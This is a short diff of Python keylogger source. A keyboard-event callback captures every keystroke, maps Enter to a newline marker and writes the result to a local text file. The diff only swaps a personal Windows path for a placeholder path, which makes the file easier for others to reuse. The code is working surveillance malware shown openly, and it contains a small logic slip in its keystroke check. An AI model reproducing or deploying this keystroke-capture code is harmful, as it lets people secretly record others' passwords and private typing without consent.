@@ -10,10 +10,10 @@ def OnKeyboardEvent(event):
     if event.Ascii==5:
         _exit(1)
     if event.Ascii !=0 or 8:
-        f=open('c:\Users\Suriyaa\Downloads\output.txt','r+')
+        f=open('c:\Users\your_username_here\path_to_your_file\output.txt','r+')
         buffer=f.read()
         f.close()
-        f=open('c:\Users\Suriyaa\Downloads\output.txt','w')
+        f=open('c:\Users\your_username_here\path_to_your_file\output.txt','w')
         keylogs=chr(event.Ascii)
         if event.Ascii==13:
             keylogs='/n'
